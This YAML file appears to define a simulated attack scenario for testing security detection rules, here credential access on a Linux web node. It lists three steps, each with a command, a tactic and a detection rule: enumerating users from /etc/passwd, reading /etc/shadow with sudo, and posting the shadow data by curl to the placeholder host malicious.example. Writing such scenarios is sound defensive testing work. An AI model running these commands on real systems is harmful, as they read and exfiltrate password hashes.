id: scn-easy-linux-creds
name: Easy Linux Credential Access
difficulty: easy
description: Simulated credential access attempts on a Linux web node.
steps:
  - id: step-enum-users
    name: Enumerate local users
    tactic: Discovery
    command: "cat /etc/passwd | cut -d: -f1"
    detectionRuleId: det-linux-enum-users
    expectedDetectionDelaySec: 12
  - id: step-shadow-access
    name: Shadow file read attempt
    tactic: Credential Access
    command: "sudo cat /etc/shadow"
    detectionRuleId: det-shadow-file-read
    expectedDetectionDelaySec: 18
  - id: step-creds-exfil
    name: Exfiltrate hashed credentials
    tactic: Exfiltration
    command: "curl -X POST https://malicious.example/upload -d @shadow.txt"
    detectionRuleId: det-sensitive-file-exfil
    expectedDetectionDelaySec: 27
